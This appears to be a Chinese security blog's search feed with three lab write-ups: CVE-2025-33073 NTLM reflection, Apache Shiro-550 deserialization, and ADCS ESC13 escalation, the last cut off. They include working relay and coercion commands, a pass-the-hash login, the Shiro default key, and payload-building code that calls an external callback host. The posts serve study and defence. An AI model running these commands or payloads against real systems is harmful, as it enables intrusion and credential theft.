<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2025-33073：NTLM Reflect</title>
      <link href="/post/c939f872.html"/>
      <url>/post/c939f872.html</url>
      
        <content type="html"><![CDATA[<p>由Kerberos Reflect来的灵感，通过创建一个指向中继机器的spn，利用特殊的spn格式重新实现<font style="color:#DF2A3F;"><strong>NTLM Reflect</strong></font></p><p>感觉文章内说的一句话真的非常好：</p><blockquote><p>some researches demonstrate that bypassing mitigations is just a matter of digging into what the mitigation actually does.<br><strong>一些研究表明，绕过缓解措施其实只是深入研究缓解措施实际作用的问题。</strong></p></blockquote><p><strong><a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html">NTLM本地验证</a> + <a href="https://x.com/D1iv3/status/1762438159357657404">Kerberos 反射</a> &#x3D;  CVE-2025-33073</strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在NTLM认证中存在着一种 <font style="color:#DF2A3F;"><strong>NTLM 本地验证</strong></font> 的特殊情况，服务器在 <font style="color:#DF2A3F;"><strong>NTLM_CHALLENGE</strong></font> 消息中设置<font style="color:#DF2A3F;"><strong>“Negotiate Local Call”</strong></font> 标志后，客户端（与服务器同一机器）会将令牌直接插入服务器上下文，同时在 <font style="color:#DF2A3F;"><strong>Reserved</strong></font> 字段中插入上下文 ID，且整个过程在lsass.exe进程内完成。</p><p>当我们直接用IP进行中继的时候， <font style="color:#DF2A3F;"><strong>Reserved</strong></font> 字段为NULL，本地验证未启用，此时Reflect会失败</p><img src="/post/c939f872/1749894046214-34a280ec-ed86-469b-9a17-82ac0828ddcf.png" class=""><img src="/post/c939f872/1749894073069-7a608955-6ffa-466b-9cbc-2fd7cc5a3825.png" class=""><p>当我们添加了dns用域名进行中继的时候</p><img src="/post/c939f872/1749893780598-42a160cc-556b-40f8-8f17-8f464f5bceaf.png" class=""><p><strong><font style="color:#DF2A3F;">Reserved</font></strong> 字段被设置，认证流程发生改变，服务器将根据 <strong><font style="color:#DF2A3F;">NTLM_NEGOTIATE</font></strong> 消息中的两个字段做出决定 ：工作站名称和域。而特殊DNS记录解析后，目标名称的处理结果与机器名匹配，从而触发本地认证流程，Reflect攻击成功。</p><p>可以看到在我们 <strong><font style="color:#DF2A3F;">NTLM_NEGOTIATE</font></strong> 里面包含了我们正确的工作站名称和域</p><img src="/post/c939f872/1749893863663-6f8de279-659e-46db-b2a4-07ffdd35d421.png" class=""><p>说明客户端将 DNS 记录 <code>adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code>最终等效于adcs，并提示服务器应考虑 NTLM 本地身份验证</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>注意，一切的前提是，机器<font style="color:#DF2A3F;">不需要SMB签名</font></strong></p><p>我们这里以adcs为例子，如果想以域控为目标需要关闭域控的smb签名</p><p>实验环境</p><blockquote><p>攻击（中继）机器：10.10.0.143</p><p>adcs机器：10.10.0.134</p><p>域控：10.10.0.129</p></blockquote><p>因为涉及到dns和域名，所以需要修改本地hosts文件</p><h3 id="创建dns记录"><a href="#创建dns记录" class="headerlink" title="创建dns记录"></a>创建dns记录</h3><p>我们创建一条指向攻击机器的dns解析记录，创建的值为目标主机名+<code>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 dnstool.py 10.10.0.129 -u &#x27;esg-red.local\jack&#x27; -p ADjk6666 -dc-ip 10.10.0.129 -a add -r adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.0.143 -a modify</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Modifying record</span><br><span class="line">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure><img src="/post/c939f872/1749891985185-2964b521-5259-4d27-a0a6-cecd25568e58.png" class=""><p>等待一段时间等dns解析记录刷新，本地环境可以用下面的命令刷新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure><h3 id="运行中继脚本"><a href="#运行中继脚本" class="headerlink" title="运行中继脚本"></a>运行中继脚本</h3><p>开启ntlmrelayx进行中继</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -t adcs.esg-red.local -smb2support</span><br></pre></td></tr></table></figure><img src="/post/c939f872/1749892124434-e680c12a-f7d6-4753-ba04-76aaa7de963d.png" class=""><h3 id="强制认证"><a href="#强制认证" class="headerlink" title="强制认证"></a>强制认证</h3><p>我们这里利用PetitPotam.py来进行强制认证</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PetitPotam.py -u jack -p ADjk6666 -d esg-red.local adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA adcs.esg-red.local</span><br></pre></td></tr></table></figure><img src="/post/c939f872/1749892240135-6e849328-edef-42ee-893b-4b0af1030176.png" class=""><p>最终ntlmrelayx成功收到认证并Reflect回adcs获取了sam文件</p><img src="/post/c939f872/1749892307343-e08e92b5-5410-4e1b-9abc-e08535d146c6.png" class=""><p>使用wmiexec成功连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py esg-red.local/administrator@10.10.0.134 -hashes :05c8bbcf5529a77e495a98b522f36e91</span><br></pre></td></tr></table></figure><img src="/post/c939f872/1749892718545-403fde38-2bff-4e12-a730-af2f3c9f3945.png" class=""><h2 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h2><ol><li>打微软补丁</li><li>强制域内机器SMB签名</li></ol><p>参考文档：</p><ul><li><a href="https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025</a></li><li><a href="https://mp.weixin.qq.com/s/t74_SIMZTiT_ghORC2NmtA">https://mp.weixin.qq.com/s/t74_SIMZTiT_ghORC2NmtA</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> AD域 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AD域 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化漏洞-Shiro550</title>
      <link href="/post/671766ae.html"/>
      <url>/post/671766ae.html</url>
      
        <content type="html"><![CDATA[<p><strong>漏洞原理</strong>：Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户的登录信息加密编码，然后存储在Cookie中。对于服务端，如果检测到用户的Cookie，首先会读取rememberMe的Cookie值，然后进行base64解码，然后进行AES解密再反序列化。</p><h3 id="1-加密流程分析"><a href="#1-加密流程分析" class="headerlink" title="1. 加密流程分析"></a>1. 加密流程分析</h3><p>当我们勾选记住密码的选项之后，登录时断点打到<code>DefaultSecurityManager.rememberMeSuccessfulLogin</code>方法下</p><img src="/post/671766ae/1745593845459-3eb4a4e1-c841-418c-88ed-a724e0045b3d.png" class="" title="img"><p>获取一个<code>RememberMeManager</code>对象之后进入<code>onSuccessfulLogin</code>方法</p><img src="/post/671766ae/1745594253355-9ee11183-a261-4a09-806e-db732421d773.png" class="" title="img"><p>调用<code>forgetIdentity()</code>方法对<code>subject</code>进行处理，<code>subject</code>对象表示单个用户的状态和安全操作，包含认证、授权等，跟进</p><img src="/post/671766ae/1745594410892-a7f2dba2-aab8-4a13-9ce3-258f0fa95286.png" class="" title="img"><p>在<code>forgetIdentity()</code>方法中，对subject进行了处理</p><img src="/post/671766ae/1745594571662-9ec946b7-dd8c-448f-86a4-a750c51cde36.png" class="" title="img"><p>我们继续跟进<code>forgetIdentity</code>，<code>getCookie()</code>方法获取请求的cookie，接着会进入到<code>removeFrom()</code>方法</p><img src="/post/671766ae/1745594630343-5e9ea64f-0d8f-4e40-bed9-e1686510f858.png" class="" title="img"><p>跟进<code>removeFrom()</code>方法，removeForm主要在response头部添加字段<code>Set-Cookie: rememberMe=deleteMe</code></p><img src="/post/671766ae/1745594803509-43b5a83d-61ef-4dfb-91e7-5cd58b7709ec.png" class="" title="img"><img src="/post/671766ae/1745594871099-58efd40c-34f5-4fa5-8499-f5d27a870078.png" class="" title="img"><p>然后我们再次回<code>到onSuccessfulLogin</code>方法中，如果设置了<code>rememberMe</code>则进入<code>rememberIdentity</code>方法</p><img src="/post/671766ae/1745655562626-667361d2-fae4-4dcc-8c8d-c3306917ee6f.png" class="" title="img"><p>我们跟进看看后续怎么处理的，<code>rememberIdentity</code>方法中主要是两部分，一部分是<code>convertPrincipalsToBytes</code>方法用来清除之前的认证信息，并根据用户名生成新的<code>Principal</code></p><img src="/post/671766ae/1745655607054-e1f66533-7bc3-4e0e-8768-736c4214d451.png" class="" title="img"><p>我们跟进<code>convertPrincipalsToBytes</code>方法查看，发现主要干了两件事情</p><ol><li>将我们的<code>principals(用户名)</code>序列化</li><li>对序列化之后的结果进行加密</li></ol><img src="/post/671766ae/1745655722539-7b45c3e8-8394-410f-bbe0-b5a6cc4681fe.png" class="" title="img"><p>我们继续跟进我们的加密算法<code>encrypt</code>，看看如何加密的</p><img src="/post/671766ae/1745655809005-861e662a-6b9b-4e9a-8265-a8de697ef0ae.png" class="" title="img"><p>这里可以通过<code>getCipherService</code>获取的加密对象，看到是一个很明显的AES加密</p><img src="/post/671766ae/1745655870478-7a2e63d4-82ab-4824-a5b9-2917bae19333.png" class="" title="img"><p>那么我们跟进<code>getEncryptionCipherKey()</code>函数，发现加密密钥返回的是<code>encryptionCipherKey</code>值</p><img src="/post/671766ae/1745655974611-09ba3d1f-7ce4-4090-a3d0-f79d50391ab9.png" class="" title="img"><p>我们看看它是在哪里设置的，发现<code>setEncryptionCipherKey</code>函数是赋值的</p><img src="/post/671766ae/1745656041317-475e6f35-cd7d-4f7b-a40d-347d3e481f71.png" class="" title="img"><p>在<code>setCipherKey()</code>函数中对其进行赋值，而且赋值的是一个常量<code>DEFAULT_CIPHER_KEY_BYTES</code></p><img src="/post/671766ae/1745656138916-ad5d42ad-c508-43a2-897e-5205592a7878.png" class="" title="img"><img src="/post/671766ae/1745656194076-b07e2abd-0b79-4d68-8c42-e7c5521b8810.png" class="" title="img"><p>是一个写死的base64字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure><img src="/post/671766ae/1745656231986-696790b8-cbb1-44a5-8e16-c757bffffbf5.png" class="" title="img"><p>让我们返回到刚刚的流程，<code>convertPrincipalsToBytes</code>之后进入我们的<code>rememberSerializedIdentity</code>部分</p><img src="/post/671766ae/1745656389768-9cc64f61-cd2f-433a-ad71-a561d23a06a6.png" class="" title="img"><p>这里就是很简单的将结果base64加密，然后设置到cookie里面</p><img src="/post/671766ae/1745656459040-de882378-52d5-460d-bf85-9f212caa8bd9.png" class="" title="img"><p>至此，加密部分我们基本了解完毕：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">序列化principals(用户名) -&gt; 对结果进行AES加密 -&gt; 对结果进行base64加密 -&gt; 设置到cookie中</span><br></pre></td></tr></table></figure><p>大致流程</p><img src="/post/671766ae/1745657755938-9dd3fab3-c66d-4e7a-902b-71104f88faf7.png" class="" title="img"><h3 id="2-解密流程分析"><a href="#2-解密流程分析" class="headerlink" title="2. 解密流程分析"></a>2. 解密流程分析</h3><p>我们登录之后利用burp重新发包，看看cookie是如何解密的，发包之后发现并没有断住，是因为除了cookie之外，它还通过<code>JSESSIONID=C434C16E1B719C7DFC51E116A05638E3</code>来鉴权，当存在<code>JSESSIONID</code>的时候不会触发反序列化</p><img src="/post/671766ae/1745657285251-08141fac-4358-473c-a510-2307a859e703.png" class="" title="img"><p>我们删除<code>JSESSIONID=C434C16E1B719C7DFC51E116A05638E3</code>再试一次</p><p>成功断在<code>AbstractRememberMeManager.getRememberedPrincipals</code>处</p><img src="/post/671766ae/1745657390597-ca472214-801b-4560-a17f-0da6ff499af5.png" class="" title="img"><p>我们进入<code>getRememberedSerializedIdentity</code>方法，看名字应该是处理反序列化的，它从我们的请求中读取base64加密之后的cookie</p><img src="/post/671766ae/1745657922161-6c71b1e3-1747-40fa-a6bf-4f2bd900ced2.png" class="" title="img"><p>判断cookie是否被删除、确保base64字符串被正确的填充，最后将base64解码为字节数组</p><img src="/post/671766ae/1745658079070-6a8206ab-2dbe-42a6-b472-d95f77913e0c.png" class="" title="img"><p>将字节数组返回到我们的<code>getRememberedPrincipals</code>方法中，然后调用<code>convertBytesToPrincipals</code>方法来从字节数组中获取我们的权限（Principals）</p><img src="/post/671766ae/1745658407215-89e4c661-68ea-4c7c-9220-19b42a46da8b.png" class="" title="img"><p>调用<code>decrypt</code>方法来AES解码，和上面加密步骤基本相同，密钥也是默认密钥</p><img src="/post/671766ae/1745658479195-5a90db22-1aaf-4d5f-aeac-e34ef8c0de1a.png" class="" title="img"><p>唯一值得注意的是我们的解密向量iv是根据传入的数据一起的</p><img src="/post/671766ae/1745660102744-a1f1c078-541d-45a8-981f-d97fab4d6096.png" class="" title="img"><p>返回<code>deserialize(bytes)</code>的值，我们看看<code>deserialize()</code>方法，继续跟进发现调用的是默认的反序列化方法</p><img src="/post/671766ae/1745658963832-e6081a77-fbb7-473f-be31-66f0e6e8e6a7.png" class="" title="img"><p>一路走到<code>readObject</code>方法，触发反序列化</p><p>整体过程如下：</p><img src="/post/671766ae/1745659105662-cb23b09f-6c1d-46c8-b804-0903097f83b9.png" class="" title="img"><h3 id="3-利用"><a href="#3-利用" class="headerlink" title="3. 利用"></a>3. 利用</h3><p>我们可以利用URLDNS链进行探测</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URLDNS.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://vutze5lcx77o4jsznfpk1lwyvp1gp6dv.oastify.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        Field hashcode=clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url,<span class="number">123</span>);</span><br><span class="line">        <span class="comment">//        System.out.println(hashcode.get(url));</span></span><br><span class="line">        map.put(url,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        hashcode.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        <span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object object=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac URLDNS.java</span><br><span class="line">java URLDNS</span><br></pre></td></tr></table></figure><p>在目录下生成了ser.bin的二进制文件，我们利用python脚本对其进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_bin</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS=AES.block_size</span><br><span class="line">    pad=<span class="keyword">lambda</span> s:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">    key=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode=AES.MODE_CBC</span><br><span class="line">    iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor=AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data))).decode()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data=convert_bin(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(AES_enc(data))</span><br></pre></td></tr></table></figure><img src="/post/671766ae/1745660567307-32c2eeae-5294-4afe-bd48-61d23a6022dc.png" class="" title="img"><p>将序列化数据填入到cookie中，然后删除<code>JSESSIONID</code>，发送数据包</p><img src="/post/671766ae/1745660623111-2a6ec5bc-0f1f-4be4-8714-134357d7fd06.png" class="" title="img"><p>burp成功收到请求</p><img src="/post/671766ae/1745660668444-8bc62ad9-a335-48c7-a4f3-36200b1fe5cd.png" class="" title="img"><p>参考文档：</p><ul><li><a href="https://goodapple.top/archives/139">https://goodapple.top/archives/139</a></li><li><a href="https://changxia3.com/">https://changxia3.com/</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzkwMzQyMTg5OA==&mid=2247486322&idx=1&sn=fbd61172d2e9bb94ebd76a78608b2ced">https://mp.weixin.qq.com/s?__biz=MzkwMzQyMTg5OA==&amp;mid=2247486322&amp;idx=1&amp;sn=fbd61172d2e9bb94ebd76a78608b2ced</a></li><li><a href="https://www.cnblogs.com/1vxyz/p/17572415.html">https://www.cnblogs.com/1vxyz/p/17572415.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>滥用ADCS进行权限提升—ESC13详解</title>
      <link href="/post/48e6280e.html"/>
      <url>/post/48e6280e.html</url>
      
        <content type="html"><![CDATA[<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/13864">https://xz.aliyun.com/t/13864</a></p><h2 id="0x1-起因："><a href="#0x1-起因：" class="headerlink" title="0x1 起因："></a>0x1 起因：</h2><p>​       自 Will Schroeder（<a href="https://twitter.com/harmj0y">@harmj0y</a>）和 Lee Christensen（<a href="https://twitter.com/tifkin_">@tifkin_</a>）在 2021 年的 BlackHat 大会上发布白皮书以来，ADCS的攻击面首次系统化的进入人们的视野。<a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned - Abusing Active Directory Certificate Services</a>这本白皮书可以说是为ADCS的利用奠定了各种理论基础。<br>​       随着ADCS的利用越加广泛，各种工具层出不穷，其中Certipy更是其中的佼佼者，近日在学习Certipy的相关代码实现的时候，偶然发现了这样一条PR</p><img src="/post/48e6280e/image-20240302144636132.png" class="" title="image-20240302144636132"><p>众所周知（应该），在白皮书中一共介绍了ESC1-ESC8这8种ESC命名的攻击手法，后续又补充了<a href="https://medium.com/u/cd3a881c1abc?source=post_page-----fda4272fbd53--------------------------------">Oliver Lyak</a>提出的<a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">ESC9和ESC10</a>、 <a href="https://twitter.com/sploutchy">Sylvain Heiniger</a>提出的中继到RPC的 <a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">ESC11</a>和利用条件比较局限的的<a href="https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm">ESC12</a>，针对这条PR附带的<a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53">博客文章</a>，我尝试对这个ESC13进行分析和复现。</p><h2 id="0x2-分析："><a href="#0x2-分析：" class="headerlink" title="0x2 分析："></a>0x2 分析：</h2><p>​       首先，先上结论：正如标题，这不是一个可以和ESC1或者ESC8一样可以直接获取域内权限的致命漏洞，它只能算是一个域内权限提升漏洞，提升的权限取决于你错误配置指向的组的权限，且它的限制颇多。<br>   说的详细一点的话就是，我们可以使用指向给定 AD 组的 OID 组链接的颁发策略来配置证书模板。当我们用这个模板申请证书成功之后，我们利用该证书进行身份验证就可以获取这个组的权限，哪怕我们的用户不在这个组里。</p><p>这里面涉及到三个关键：</p><ul><li>颁发策略</li><li>指向AD组的OID组链接</li><li>使用证书认证</li></ul><p>我们对此进行逐步分析</p><h3 id="证书颁发策略"><a href="#证书颁发策略" class="headerlink" title="证书颁发策略"></a>证书颁发策略</h3><p>证书颁发策略是指用于控制证书颁发的一组规则和条件。颁发策略定义了在何种情况下、以何种方式以及向谁颁发证书。<br>我们可以打开一个证书模板查看其拓展，可以看到是包括了颁发策略这一部分的，而且当前模板默认是没有值</p><img src="/post/48e6280e/image-20240302144648367.png" class="" title="image-20240302144648367"><p>我们可以点击编辑添加颁发策略，也可以新建我们自己的颁发策略</p><img src="/post/48e6280e/image-20240302144656542.png" class="" title="image-20240302144656542"><p>证书的颁发策略同样是用OID进行标志的，它存储在LDAP中的CN&#x3D;OID,CN&#x3D;Public Key Services,CN&#x3D;Services,CN&#x3D;Configuration,DC&#x3D;esg-red,DC&#x3D;local中，每一个CN代表一个OID对象</p><img src="/post/48e6280e/image-20240302144703128.png" class="" title="image-20240302144703128"><p>同样我们也可以通过powershell来查看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADObject</span> <span class="literal">-Filter</span> * <span class="literal">-SearchBase</span> <span class="string">&quot;CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=esg-red,DC=local&quot;</span> <span class="literal">-Properties</span> DisplayName,msPKI<span class="literal">-Cert-Template-OID</span></span><br></pre></td></tr></table></figure><img src="/post/48e6280e/image-20240302144710141.png" class="" title="image-20240302144710141"><p>注意，上面存储的OID是ADCS中所有的OID，而证书模板具有的颁发策略的OID则存储在证书模板中的msPKI-Certificate-Policy属性中</p><img src="/post/48e6280e/image-20240302144715770.png" class="" title="image-20240302144715770"><h3 id="OID组链接"><a href="#OID组链接" class="headerlink" title="OID组链接"></a>OID组链接</h3><p>对应CN&#x3D;OID这个容器，我们可以看到它是一个<code>msPKI-Enterprise-Oid</code>类，而对于这个类，它存在一个继承 的<code>msDS-OIDToGroupLink</code>属性</p><img src="/post/48e6280e/image-20240302144720831.png" class="" title="image-20240302144720831"><img src="/post/48e6280e/image-20240302144727176.png" class="" title="image-20240302144727176"><p><code>msDS-OIDToGroupLink</code>这个属性便是ESC13的关键，它标识了与该 OID 表示的发布策略对应的组对象。换句话说，我们可以利用这个属性将我们的颁发策略和相应的AD组链接起来，如果用户利用带有相关颁发策略的证书进行身份验证，那么系统将认为该用户作为AD组的成员（用户不在该组中)，并授予相应的权限。</p><img src="/post/48e6280e/image-20240302144738676.png" class="" title="image-20240302144738676"><p>但是并不是任何组都可以被颁发策略链接的，它需要满足以下要求</p><ol><li>必须是AD的通用组</li><li>组内没有任何成员</li></ol><p>当我们设置了<code>msDS-OIDToGroupLink</code>属性后，尝试向这个组内添加成员会报错</p><img src="/post/48e6280e/image-20240302144751089.png" class="" title="image-20240302144751089"><h3 id="证书认证："><a href="#证书认证：" class="headerlink" title="证书认证："></a>证书认证：</h3><p>前面说到，这是利用证书颁发策略的<code>msDS-OIDToGroupLink</code>属性导致的权限滥用，所以我们必须要使用证书进行身份验证才行，也就是说我们的证书模板要支持证书认证。<br>我们可以验证一下，我们为ESCUser13用户申请具有漏洞的ESC13模板证书，我们利用Rubeus申请TGT票据，并利用krbtgt的密钥解密查看PAC部分</p><img src="/post/48e6280e/image-20240302144756431.png" class="" title="image-20240302144756431"><p>我们可以看到ESC13User除了默认的513User组外，没有加入任何其他组</p><img src="/post/48e6280e/image-20240302144802852.png" class="" title="image-20240302144802852"><p>但是在我们查看票据的PAC的时候，可以看到它拥有着ESC13Group这个组的权限</p><img src="/post/48e6280e/image-20240302144806915.png" class="" title="image-20240302144806915"><img src="/post/48e6280e/image-20240302144812103.png" class="" title="image-20240302144812103"><p>而我们利用正常账号密码申请票据，发现只有一个513User组</p><img src="/post/48e6280e/image-20240302144817366.png" class="" title="image-20240302144817366"><img src="/post/48e6280e/image-20240302144824808.png" class="" title="image-20240302144824808"><h2 id="0x3-漏洞复现："><a href="#0x3-漏洞复现：" class="headerlink" title="0x3 漏洞复现："></a>0x3 漏洞复现：</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>搭建域控和ADCS的步骤这里不再赘述了<br>域控：DC Windows server 2019 Datacenter 10.10.10.128<br>ADCS：ADCS Windows server 2019 Datacenter 10.10.10.131<br>域名：esg-red.local<br>CA名：esg-red-ADCS-CA<br>首先我们新建一个普通用户，确保它没有加入任何其他组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> ESC13User <span class="literal">-Properties</span> MemberOf</span><br></pre></td></tr></table></figure><img src="/post/48e6280e/image-20240302144832095.png" class="" title="image-20240302144832095"><p>然后创建一个通用组，组内没有任何用户</p><img src="/post/48e6280e/image-20240302144859596.png" class="" title="image-20240302144859596"><img src="/post/48e6280e/image-20240302144908853.png" class="" title="image-20240302144908853"><p>为了验证权限，我们为这个组设置对域内DCSync的权限</p><img src="/post/48e6280e/image-20240302144914080.png" class="" 